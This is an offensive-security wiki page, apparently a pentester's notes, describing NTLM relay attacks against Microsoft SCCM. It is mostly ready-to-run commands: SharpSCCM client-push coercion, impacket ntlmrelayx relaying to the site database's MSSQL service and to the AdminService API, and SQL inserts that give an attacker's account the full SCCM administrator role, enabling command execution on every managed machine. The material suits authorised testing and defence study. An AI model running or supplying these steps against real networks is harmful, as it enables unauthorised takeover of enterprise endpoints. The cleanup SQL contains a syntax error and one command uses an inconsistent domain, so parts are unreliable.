---
title: SCCM Relaying
---

[[notes/ad/ntlm-relaying]] between SCCM clients and servers.

# Relay to clients

When *Client Push Installation* is configured the [[notes/ad/sccm]] server connects to new Windows computers to install the SCCM client.
For that it uses a domain account that must have local admin privileges on all clients managed by SCCM.
If multiple push accounts are configured SCCM tries them one after another until authentication succeeds.
If all attempts fail the computer account of the SCCM server is used.

Requirements:

- *Automatic Site Assignment* must be configured (not default, but required for push installation)
- *Automatic Site-wide Client Push Installation* must be enabled (not default, but common)
- *Allow connection fallback to NTLM* must be enabled (was default, new installations have it disabled)

Check which users are local admin and remove them from the local administrators group, so SCCM is forced to send all credentials it has.

=== "builtin"
    ~~~ bat
    net.exe localgroup administrators
    net.exe user sccmpush /delete
    ~~~

If NTLM fallback is disabled and you control the computer object, you can force the SCCM server to use NTLM nevertheless.
This was patched in October 2022.

=== "builtin"
    ~~~ bat
    setspn.exe -L ws01
    setspn.exe -D host/ws01 ws01
    setspn.exe -D host/ws01.corp.local ws01
    ~~~

As unprivileged user on a SCCM-managed computer coerce NTLM from the SCCM server over SMB to a computer were you can listen on port 445 and [[notes/ad/ntlm-relay-to-smb|relay to SMB]] of other SCCM-managed clients.
The SCCM server will try to authenticate with all configured push accounts.

=== "[[notes/tools/sharpsccm]]"
    ~~~ bat
    .\SharpSCCM.exe invoke client-push -mp sccmmp01.corp.local -sc CRP -t 192.158.178.42
    ~~~

Cleanup.
The UUID is printed by the command above.

=== "[[notes/tools/sharpsccm]]"
    ~~~ bat
    .\SharpSCCM.exe remove device %uuid% -mp sccmmp01.corp.local -sc CRP
    ~~~

References:

- [Coercing NTLM authentication from SCCM](http://web.archive.org/web/20221122215409/https://scribe.rip/@specterops/coercing-ntlm-authentication-from-sccm-e6e23ea8260a)
- [Push comes to shove: Exploring the attack surface of SCCM client push accounts](http://web.archive.org/web/20221231133551/https://www.hub.trimarcsecurity.com/post/push-comes-to-shove-exploring-the-attack-surface-of-sccm-client-push-accounts)
- [Push comes to shove: Bypassing Kerberos authentication of SCCM client push accounts](http://web.archive.org/web/20221210034303/https://www.hub.trimarcsecurity.com/post/push-comes-to-shove-bypassing-kerberos-authentication-of-sccm-client-push-accounts)

# Relay to site database server

The computer account of the primary site server is local administrator on the site database server and on every site server hosting the *SMS Provider* role.
You can perform NTLM relaying [[notes/ad/ntlm-relay-from-smb|from SMB]] either [[notes/ad/ntlm-relay-to-smb|to SMB]] or [[notes/ad/ntlm-relay-to-mssql|to MSSQL]].

## Relay to SMB

Coerce the primary site server [[notes/ad/ntlm-relay-from-smb|via SMB]] and try relaying to any other SCCM server [[notes/ad/ntlm-relay-to-smb|over SMB]].

## Relay to MSSQL

Identify the site database server.

~~~
❯ sccmhunter show -smb
...
|    | Hostname            | Site Code | Signing Status | Site Server | Distribution Point | WSUS  | MSSQL |
...
|  1 | sccmdb01.corp.local | CRP       | False          | True        | True               | True  | True  |
+----+---------------------+-----------+----------------+-------------+--------------------+-------+-------+
|  2 | sccmdp01.corp.local | CRP       | False          | False       | True               | False | False |
...
~~~

Get the SID of your user in hex format ([source](https://www.thehacker.recipes/ad/movement/sccm-mecm#sccm-site-takeover)).

=== "[[notes/tools/impacket]]"
    ~~~ bash
    sid=$(rpcclient -U jdoe%'passw0rd' dc01.corp.local -c 'lookupnames jdoe' | cut -d ' ' -f 2)
    hexsid=$(python3 -c 'import sys;from impacket.ldap.ldaptypes import LDAP_SID;s=LDAP_SID();s.fromCanonical(sys.argv[1]);print("0x"+"".join(f"{b:02X}" for b in s.getData()))' $sid)
    ~~~

=== "[[notes/tools/sharpsccm]]"
    ~~~
    C:\> .\SharpSCCM.exe get user-sid
    ...
    [+] Active Directory SID (hex): 0x0105000000000005150000001234567890ABCDEF1234567890ABCDEF
    ~~~

Start relaying to the MSSQL site database.

~~~ bash
impacket-ntlmrelayx --no-http-server --no-raw-server --no-wcf-server -smb2support -t mssql://sccmdb01.corp.local -socks -debug
~~~

Coerce authentication from a SCCM site server.
Coercion trough client push works as well.

~~~ bash
coercer coerce -d stvw.wiesbaden.net -u jdoe -p 'passw0rd' -l 172.16.206.201 -t sccmdp01.corp.local --auth-type smb --always-continue
~~~

Connect trough the SOCKS proxy established by `impacket-ntlmrelayx` to the MSSQL server.

~~~ bash
proxychains impacket-mssqlclient -windows-auth -no-pass 'CORP/SCCMDP01$@sccmdb01.corp.local'
~~~

And give your user the SCCM administrator role ([source](https://twitter.com/_Mayyhem/status/1700602445603209236)):

~~~ sql
USE CM_CRP;
INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x0105000000000005150000001234567890ABCDEF1234567890ABCDEF,'corp\jdoe',0,0,'','','','','CRP');
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName='corp\jdoe'),'SMS0001R','SMS00ALL','29');
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName='corp\jdoe'),'SMS0001R','SMS00001','1');
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName='corp\jdoe'),'SMS0001R','SMS00004','1');
~~~

Now you can execute arbitrary commands on every SCCM-managed computer.
See [[notes/ad/sccm-admin]] for details.

Cleanup.

~~~ sql
DELETE FROM RBAC_ExtendedPermissions WHERE AdminID=(SELECT AdminID FROM RBAC_Admins WHERE LogonName='corp\jdoe');
DELETE FROM RBAC_Admins WHERE LogonName='corp\jdoe');
~~~

References:

- [SharpSCCM Demos - 2023 Black Hat USA Arsenal](https://www.youtube.com/watch?v=uyI5rgR0D-s)
- [SCCM site takeover via automatic client push installation](http://web.archive.org/web/20230112143952/https://scribe.rip/@specterops/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1)

# Relay to Admin Service API

Coerce the primary site server computer account [[notes/ad/ntlm-relay-from-smb|via SMB]] and [[notes/ad/ntlm-relay-to-http|relay to HTTP or HTTPS]].
Requires [PR 1593](https://github.com/fortra/impacket/pull/1593)

~~~ bash
impacket-ntlmrelayx -smb2support --adminservice -t https://smsprovider.corp.local/AdminService/wmi/SMS_Admin --logonname 'CORP\jdoe' --displayname 'CORP\jdoe' --objectsid $jdoe_sid
~~~

References:

- [Site Takeover via SCCM’s AdminService API](http://web.archive.org/web/20230812172242/https://scribe.rip/@specterops/site-takeover-via-sccms-adminservice-api-d932e22b2bf)

# Relay from passive to active site server

For high availability a passive site server might exist.
Its computer account is local administrator on the active site server.
Therefore you can perform classic NTLM relaying [[notes/ad/ntlm-relay-from-smb|from SMB]] [[notes/ad/ntlm-relay-to-smb|to SMB]].

References:

- [SCCM Hierarchy Takeover with High Availability](http://web.archive.org/web/20240224154010/https://scribe.rip/@specterops/sccm-hierarchy-takeover-with-high-availability-7dcbd3696b43)
